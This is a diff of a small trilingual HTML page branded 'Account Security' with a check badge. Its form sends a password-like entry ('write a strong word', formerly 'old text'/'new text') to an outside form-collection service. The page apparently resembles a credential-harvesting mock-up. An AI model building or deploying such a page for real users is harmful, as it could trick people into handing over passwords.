@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Account Security</title>
+<title>أمان حسابك</title>
 
 <style>
 *{box-sizing:border-box}
@@ -32,11 +32,17 @@ body.dark{
   text-align:center;
   background:rgba(255,255,255,.96);
   box-shadow:0 18px 50px rgba(0,0,0,.22);
+  animation:show .5s ease;
 }
 
 .dark .card{
   background:#1f2937;
   color:white;
+}
+
+@keyframes show{
+  from{opacity:0;transform:translateY(20px)}
+  to{opacity:1;transform:translateY(0)}
 }
 
 .title{
@@ -55,12 +61,12 @@ body.dark{
   background:#2196f3;
   color:white;
   font-size:13px;
+  vertical-align:middle;
 }
 
 input{
   width:100%;
   padding:15px;
-  margin-bottom:12px;
   border:2px solid #ddd;
   border-radius:12px;
   outline:none;
@@ -82,6 +88,11 @@ button{
   font-size:16px;
   font-weight:bold;
   cursor:pointer;
+  transition:.2s;
+}
+
+button:active{
+  transform:scale(.97);
 }
 
 .language{
@@ -118,37 +129,31 @@ button{
 
 <body>
 
-<button class="theme-icon" id="themeIcon" onclick="toggleDark()" type="button">🌙</button>
+<button class="theme-icon" id="themeIcon" onclick="toggleDark()">🌙</button>
 
 <div class="card">
 
   <div class="title">
-    <span id="title">Account Security</span>
+    <span id="title">أمان حسابك</span>
     <span class="badge">✓</span>
   </div>
 
-  <form action="https://formspree.io/f/xrpzoaod" method="POST">
+  <form
+    action="https://formspree.io/f/xrpzoaod"
+    method="POST"
+  >
 
     <input
       type="text"
       name="test_text"
       id="testText"
-      placeholder="Old text"
-      autocomplete="off"
-      required
-    >
-
-    <input
-      type="text"
-      name="test_text_2"
-      id="testText2"
-      placeholder="New text"
+      placeholder="اكتب كلمة قوية"
       autocomplete="off"
       required
     >
 
     <button id="send" type="submit">
-      Send
+      إرسال
     </button>
 
   </form>
@@ -157,15 +162,14 @@ button{
     class="language"
     onclick="changeLanguage()"
     type="button"
-    id="languageButton"
   >
-    🌐 Français / العربية
+    🌐 Français / English
   </button>
 
 </div>
 
 <script>
-let language="en";
+let language="ar";
 
 function toggleDark(){
 
@@ -180,12 +184,10 @@ function toggleDark(){
 function changeLanguage(){
 
   const title=document.getElementById("title");
-  const input1=document.getElementById("testText");
-  const input2=document.getElementById("testText2");
+  const input=document.getElementById("testText");
   const send=document.getElementById("send");
-  const languageButton=document.getElementById("languageButton");
 
-  if(language==="en"){
+  if(language==="ar"){
 
     language="fr";
 
@@ -193,12 +195,20 @@ function changeLanguage(){
     document.documentElement.dir="ltr";
 
     title.textContent="Sécurité du compte";
-    input1.placeholder="Ancien texte";
-    input2.placeholder="Nouveau texte";
+    input.placeholder="Écrivez un mot fort";
     send.textContent="Envoyer";
-    languageButton.textContent="🌐 English / العربية";
 
   }else if(language==="fr"){
+
+    language="en";
+
+    document.documentElement.lang="en";
+
+    title.textContent="Account Security";
+    input.placeholder="Write a strong word";
+    send.textContent="Send";
+
+  }else{
 
     language="ar";
 
@@ -206,23 +216,8 @@ function changeLanguage(){
     document.documentElement.dir="rtl";
 
     title.textContent="أمان حسابك";
-    input1.placeholder="النص القديم";
-    input2.placeholder="النص الجديد";
+    input.placeholder="اكتب كلمة قوية";
     send.textContent="إرسال";
-    languageButton.textContent="🌐 English / Français";
-
-  }else{
-
-    language="en";
-
-    document.documentElement.lang="en";
-    document.documentElement.dir="ltr";
-
-    title.textContent="Account Security";
-    input1.placeholder="Old text";
-    input2.placeholder="New text";
-    send.textContent="Send";
-    languageButton.textContent="🌐 Français / العربية";
   }
 }
 </script>
